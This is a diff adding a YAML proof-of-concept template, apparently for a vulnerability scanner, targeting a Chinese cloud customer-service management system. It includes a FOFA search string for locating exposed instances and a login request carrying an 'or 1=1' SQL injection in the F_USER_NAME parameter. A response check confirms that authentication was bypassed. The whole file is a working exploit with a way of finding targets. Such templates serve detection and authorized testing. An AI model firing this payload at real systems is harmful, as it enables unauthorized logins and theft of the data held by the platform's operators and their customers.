@@ -1,0 +1,22 @@
+id: poc-yaml-yun-duan-kefu-f-user-name-sqli
+info:
+  name: 云端客服管理系统 F_USER_NAME SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 云端客服管理系统
+  fofa: body="云端客服管理平台登录"
+requests:
+- method: GET
+  path: /Cloud/LoginSubmit?F_USER_NAME=admin%27+or+%271%27%3D%271%27+--%2B&F_PASSWORD=1&TYPES=0
+  expression: 'status_code == 200 &&
+
+    contains(body,"登录成功") &&
+
+    contains(body,"\"Status\":true") &&
+
+    contains(content_type,"application/json")
+
+    '
+variables: {}
+transport: http
